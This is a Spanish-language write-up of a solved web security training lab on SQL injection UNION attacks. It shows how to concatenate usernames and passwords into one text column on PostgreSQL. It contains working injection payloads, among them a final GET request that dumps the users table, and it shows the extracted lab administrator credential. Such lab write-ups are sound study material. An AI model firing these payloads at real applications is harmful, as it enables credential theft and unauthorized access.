# Lab 11: SQL injection UNION attack, retrieving multiple values in a single column

**Nivel:** Practitioner
**Estado:** ✅ Solved

## Descripción

Variante del ataque UNION en la que la consulta vulnerable solo tiene **una columna compatible con texto**, pero se necesita extraer **dos valores** (usuario y contraseña) de la tabla `users`. La solución es concatenar ambos valores en un solo string antes de insertarlos en esa única columna disponible.

## Metodología

1. Se determinó el número de columnas con `ORDER BY` incremental y se confirmó que solo **una** columna aceptaba texto (`UNION SELECT 'a',NULL--` funcionaba, pero `UNION SELECT NULL,'a'--` no, o viceversa según el caso).
2. Se enumeraron las tablas del sistema con `information_schema.tables`. Entre los resultados aparecían tablas con prefijo `pg_` (p. ej. `pg_catalog`, `pg_stat_*`), lo cual es una firma característica de **PostgreSQL** (tablas de catálogo internas exclusivas de este motor).
3. Se enumeraron las columnas de la tabla `users` encontrada (`username`, `password`).
4. Como solo había una columna de texto disponible, se concatenaron usuario y contraseña con el operador `||` (concatenación estándar en PostgreSQL y Oracle, a diferencia de `CONCAT()` en MySQL/SQL Server o `+` en SQL Server):
   ```
   Lifestyle' UNION SELECT username || '~' || password, NULL FROM users--
   ```
   Se usó el carácter `~` como separador para distinguir visualmente dónde termina el usuario y empieza la contraseña en el resultado.

## Payload final

```
GET /filter?category=Lifestyle'+UNION+SELECT+username+||+'~'+||+password,NULL+FROM+users--
```

## Resultado

La respuesta mostró el valor concatenado `administrator~moh7pcncydrx3htx13h3`, confirmando la contraseña del administrador en un solo campo de texto. Con esas credenciales se inició sesión exitosamente, resolviendo el laboratorio.

## Conclusión

Este laboratorio demuestra que una consulta vulnerable con **una sola columna de texto disponible** no es una limitación real para el atacante: concatenando los valores con el operador correcto del motor de base de datos (`||` en PostgreSQL/Oracle, `CONCAT()` en MySQL/SQL Server, `+` en SQL Server) es posible extraer múltiples campos en un solo paso. También reforzó cómo identificar PostgreSQL por la presencia de tablas de sistema con prefijo `pg_` en `information_schema.tables`, una pista de fingerprinting útil cuando no se puede consultar `@@version` directamente.
